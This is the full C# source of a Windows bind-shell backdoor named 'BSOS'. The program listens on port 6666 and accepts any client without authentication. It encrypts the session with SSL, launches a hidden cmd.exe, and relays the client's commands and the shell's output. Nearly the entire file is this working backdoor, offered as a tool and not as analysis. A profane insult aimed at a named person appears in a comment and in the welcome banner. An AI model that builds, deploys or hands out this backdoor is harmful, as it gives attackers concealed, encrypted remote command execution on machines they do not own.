/*
 * BSOS [Bindshell over SSL] ver 1.0
 * console application coded in C# (FW Net 3.5) IDE Visual Studio CE 2017
 * by Zinzloun 
 * fuck $alvini
 */


using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Security.Authentication;

namespace BindSSLShell
{
    class Program
    {
        static void Main(string[] args)
        {
            Backdoor._bind(6666);
        }
    }

    public class Backdoor
    {
        private TcpListener listener;               
        private Socket mainSocket;                          
        private int port;                          
        private String name;                
        private bool verbose;                       
        private Process shell;                         
        private StreamReader fromShell;
        private StreamWriter toShell;
        private StreamReader inStream;
        private StreamWriter outStream;
        private Thread shellThread;                        

        //interface to use without initialize
        public static void _bind(Int32 port)
        {
            string name = IPAddress.Any.ToString();
            Backdoor bd = new Backdoor();
            bd.startServer(name, port, true);
        }

        //start the server
        public void startServer(string ns, int porta, bool verb = false)
        {
            try
            {
                name = ns;
                port = porta;
                verbose = verb;


                if (verbose)
                    Console.WriteLine("Listening on port " + port);

                //Create the ServerSocket
                listener = new TcpListener(IPAddress.Any, port);
                listener.Start();                                   //Stop and wait for a connection
                mainSocket = listener.AcceptSocket();

                if (verbose)
                    Console.WriteLine("Client connected: " + mainSocket.RemoteEndPoint);

                //load the certificate: leave the password empty, doesn't mind
                X509Certificate2 serverCertificate = new X509Certificate2("server.pfx","");
                               
                Stream sNS = new NetworkStream(mainSocket);

                //we create the SSL stream, no client authentication is required, we support SSL3 and TLS
                SslStream sslStream = new SslStream(sNS);
                sslStream.AuthenticateAsServer(serverCertificate, clientCertificateRequired: false, enabledSslProtocols:SslProtocols.Default, checkCertificateRevocation: true);

                if (verbose)
                    DisplayCertificateInformation(sslStream);

                inStream = new StreamReader(sslStream);
                outStream = new StreamWriter(sslStream);
                outStream.AutoFlush = true;


                shell = new Process();
                shell.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                ProcessStartInfo p = new ProcessStartInfo("cmd");
                p.WindowStyle = ProcessWindowStyle.Hidden;
                p.CreateNoWindow = true;
                p.UseShellExecute = false;
                p.RedirectStandardError = true;
                p.RedirectStandardInput = true;
                p.RedirectStandardOutput = true;
                shell.StartInfo = p;
                shell.Start();
                toShell = shell.StandardInput;
                fromShell = shell.StandardOutput;
                toShell.AutoFlush = true;
                shellThread = new Thread(new ThreadStart(getShellInput));               //Start a thread to read output from the shell
                shellThread.Start();
                outStream.WriteLine("Welcome to " + name + " BindSSLShell. Fuck $alvini\n");       
                outStream.WriteLine("Starting the shell...\n");
                getInput();                                                            
                dropConnection();                                 

            }
            catch (Exception e) {
                Console.WriteLine(e.Message + ": " + e.StackTrace.ToString());
                dropConnection();

            }
        }
        //////////////////////////////////////////////////////////////////////////////////////////////
        //The run method handles shell output in a seperate thread
        //////////////////////////////////////////////////////////////////////////////////////////////

        void getShellInput()
        {
            try
            {
                String tempBuf = "";
                outStream.WriteLine("\r\n");
                while ((tempBuf = fromShell.ReadLine()) != null)
                {
                    outStream.WriteLine(tempBuf + "\r");
                }
                dropConnection();
            }
            catch (Exception) { dropConnection(); }
        }

        private void getInput()
        {
            try
            {
                String tempBuff = "";                                       //Prepare a string to hold client commands
                while (((tempBuff = inStream.ReadLine()) != null))
                {         //While the buffer is not null
                    if (verbose)
                        Console.WriteLine("Received command: " + tempBuff);
                    handleCommand(tempBuff);                                //Handle the client's commands
                }
            }
            catch (Exception) { }
        }

        private void handleCommand(String com)
        {        //Here we can catch commands before they are sent
            try
            {                                       //to the shell, so we could write our own if we want
                if (com.Equals("exit"))
                {                //In this case I catch the 'exit' command and use it
                    outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                    dropConnection();                   //to drop the connection
                }
                toShell.WriteLine(com + "\r\n");
            }
            catch (Exception) { dropConnection(); }
        }


        private void dropConnection()
        {
            try
            {
                if (verbose)
                    Console.WriteLine("Dropping Connection");
                shell.Close();
                shell.Dispose();
                shellThread.Abort();
                shellThread = null;
                inStream.Dispose();                                 //Close everything...
                outStream.Dispose();
                toShell.Dispose();
                fromShell.Dispose();
                shell.Dispose();
                mainSocket.Close();
                listener.Stop();
                return;
            }
            catch (Exception) { }
        }

        private static void DisplayCertificateInformation(SslStream stream)
        {
            Console.WriteLine("Certificate revocation list checked: {0}", stream.CheckCertRevocationStatus);

            X509Certificate localCertificate = stream.LocalCertificate;
            if (stream.LocalCertificate != null)
            {
                Console.WriteLine("Local cert was issued to {0} and is valid from {1} until {2}.",
                    localCertificate.Subject,
                    localCertificate.GetEffectiveDateString(),
                    localCertificate.GetExpirationDateString());
            }
            else
            {
                Console.WriteLine("Local certificate is null.");
            }
            
        }

    }


}
